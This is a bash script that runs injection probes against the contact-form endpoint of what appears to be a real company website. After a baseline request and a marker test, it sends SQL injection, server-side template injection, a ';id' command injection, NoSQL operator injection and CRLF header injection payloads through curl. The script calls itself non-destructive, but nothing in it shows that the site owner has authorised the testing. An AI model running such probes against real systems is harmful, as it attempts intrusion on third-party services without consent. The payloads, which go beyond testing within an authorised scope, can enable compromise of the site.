#!/bin/bash
# p15 injection probe on POST /api/send (multipart) - non-destructive, benign marker
B=https://www.infinitycapital.bh
send(){ # $1 = extra form field, $2 = field name
curl -s -m 30 -X POST "$B/api/send" \
  -F "fname=tester" -F "lname=p15" -F "areacode=+973" -F "tel=3600000" \
  -F "cname=p15test" -F "subject=Investment Opportunities" \
  -F "msg=p15 probe" -F "check=true" -F "targets=info@infinitycapital.bh" \
  -F "$1" \
  -w "\n[%{http_code}] len=%{size_download}\n" | head -c 500
}
echo "### BASELINE (no extra)"; send "" | tail -3
echo "### marker INJX7701 in msg"
curl -s -m 30 -X POST "$B/api/send" -F "fname=tester" -F "lname=p15" -F "areacode=+973" -F "tel=3600000" -F "cname=INJX7701" -F "subject=Investment Opportunities" -F "msg=INJX7701 probe" -F "check=true" -F "targets=info@infinitycapital.bh" -w "\n[%{http_code}]\n" | head -c 300
echo "### SQLi in tel (single quote)"
send "tel=3600000'" 
echo "### SQLi in cname"
send "cname=test'--"
echo "### SSTI in msg {{7*7}}"
send "msg={{7*7}}"
echo "### cmd in msg ;id"
send "msg=x;id"
echo "### NoSQL in cname"
send "cname[\$ne]=x"
echo "### header injection in fname CRLF"
send "fname=a%0d%0aX-Injected:%201"
